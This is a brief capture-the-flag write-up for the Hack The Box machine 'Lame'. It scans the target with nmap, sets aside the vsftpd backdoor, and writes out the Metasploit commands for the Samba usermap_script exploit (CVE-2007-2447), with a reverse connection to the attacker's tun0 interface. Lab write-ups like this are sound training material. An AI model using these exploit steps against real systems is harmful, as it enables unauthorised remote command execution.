# ðŸ˜’ Lame (10.10.10.3)

## Scanning

### Nmap

Let's start with the usual Nmap scan:

```bash
nmap -T4 -A 10.10.10.3 -Pn

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-07 21:09 -03

## Enumeration

As we can see, Port 21 is running FTP on VSFTPD v2.3.4, which is a vulnerable version that allows for Backdoor Command Execution, a vulnerability portraited by [CVE-2011-2523](https://www.exploit-db.com/exploits/49757).

However, in this case, the exploit won't work. This is due to the fact that there's a Firewall on the target blocking these connections. A more detailed explanation can be found [here](https://0xdf.gitlab.io/2020/04/07/htb-lame.html#beyond-root---vsftpd). That being said, we should take another route.

If we take a look at the SMB Version on the target, we can see that it is running SMB v3.0.20. This version is vulnerable to [CVE-2007-2447](https://www.exploit-db.com/exploits/16320), which is exploitable by a Metasploit module that allows for Command Execution.

So we can search for this exploit on "_msfconsole_":

```bash
msf6 > search username map
```

## Exploitation

Now we just setup our options:

{% code overflow="wrap" %}
```bash
# First, we'll setup our "rhosts", which is our target's IP
msf6 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3

# Next, we set our "lhost" to our IP, which, once connected to HTB's VPN should be your "tun0"
msf6 exploit(multi/samba/usermap_script) > set lhost tun0

# Then, run
msf6 exploit(multi/samba/usermap_script) > run
```
{% endcode %}

And this was the CTF!&#x20;

Thank you so much for taking the time to read my WriteUp!

See you in another box!
